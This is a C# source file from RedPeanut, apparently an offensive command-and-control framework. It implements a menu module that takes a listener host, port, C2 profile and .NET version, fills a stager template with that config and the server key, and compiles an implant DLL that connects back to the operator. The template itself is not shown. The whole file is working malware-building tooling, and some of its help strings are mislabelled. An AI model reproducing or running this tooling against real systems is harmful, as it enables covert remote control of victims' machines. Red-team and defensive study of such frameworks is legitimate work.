//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Collections.Generic;
using System.IO;
using static RedPeanut.Utility;

namespace RedPeanut
{
    public class LauncherDllManager : IMenu
    {
        public static Dictionary<string, string> mainmenu = new Dictionary<string, string>
        {
            { "set filename", "Set Domain" },
            { "set lhost", "Set username" },
            { "set lport", "Set password" },
            { "set profile", "Set profile" },
            { "set targetframework", "Set target framework (35,40)" },
            { "run", "Execute module" },
            { "options", "Print current config" },
            { "info", "Print help" },
            { "back", "Back to lateral menu" }
        };

        public void RePrintCLI()
        {
            Utility.RePrintCLI(agent, modulename);
            return;
        }

        IAgentInstance agent = null;
        string modulename = "dll";
        string filename = null;
        string lhost = null;
        int lport = 0;
        int profile = 0;
        int targetframework = 40;

        bool exit = false;

        public LauncherDllManager()
        {

        }

        public LauncherDllManager(IAgentInstance agent)
        {
            this.agent = agent;
        }

        public void Execute()
        {
            exit = false;
            string input;
            SetAutoCompletionHandler(mainmenu);
            do
            {
                input = RedPeanutCLI(agent, modulename);
                LauncherMenu(input);
            } while (!exit);
        }

        private void LauncherMenu(string input)
        {
            string f_input = ParseSelection(input);

            if (!string.IsNullOrEmpty(input))
            {
                if (mainmenu.ContainsKey(f_input.TrimEnd()))
                {
                    switch (f_input.TrimEnd())
                    {
                        case "set filename":
                            filename = GetParsedSetString(input);
                            break;
                        case "set lhost":
                            lhost = GetParsedSetString(input);
                            break;
                        case "set lport":
                            lport = GetParsedSetInt(input);
                            break;
                        case "set profile":
                            profile = GetParsedSetInt(input);
                            break;
                        case "set targetframework":
                            targetframework = GetParsedSetInt(input);
                            break;
                        case "run":
                            Run();
                            break;
                        case "options":
                            PrintCurrentConfig();
                            break;
                        case "info":
                            PrintOptions("info", mainmenu);
                            break;
                        case "back":
                            Program.GetMenuStack().Pop();
                            exit = true;
                            return;
                        default:
                            Console.WriteLine("We had a woodoo");
                            break;
                    }
                }
                else
                {
                    PrintOptions("Command not found", mainmenu);
                }
            }
        }

        private void Run()
        {
            List<string> args = new List<string>();
            try
            {
                if (string.IsNullOrEmpty(filename) || string.IsNullOrEmpty(lhost) || lport < 1 || profile < 1)
                {
                    return;
                }
                else
                {
                    // Parse .cs sorce and repalce variable
                    string folderrpath = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, TEMPLATE_FOLDER);
                    if (Program.GetC2Manager().GetC2Server().GetProfiles().ContainsKey(profile))
                    {
                        ListenerConfig conf = new ListenerConfig("", lhost, lport, Program.GetC2Manager().GetC2Server().GetProfile(profile), profile);
                        string source = File.ReadAllText(Path.Combine(folderrpath, STAGER_TEMPLATE));
                    

                        if(targetframework == 40)
                        {
                            source = Replacer.ReplaceAgentProfile(source, RedPeanut.Program.GetServerKey(), 40, conf);
                            Builder.GenerateDll(source, filename);
                        }                   
                        else
                        {
                            source = Replacer.ReplaceAgentProfile(source, RedPeanut.Program.GetServerKey(), 35, conf);
                            Builder.GenerateDll(source, filename, 35);
                        }
                    
                    }
                }
            }catch(Exception e)
            {
                Console.WriteLine("[*] Error running task build {0}", e.Message);
                return;
            }
}

        private void PrintCurrentConfig()
        {
            Dictionary<string, string> properties = new Dictionary<string, string>
            {
                { "filename", filename },
                { "lhost", lhost },
                { "lport", lport.ToString() },
                { "profile", profile.ToString() },
                { "targetframework", targetframework.ToString() }
            };

            Utility.PrintCurrentConfig(modulename, properties);
        }

    }
}
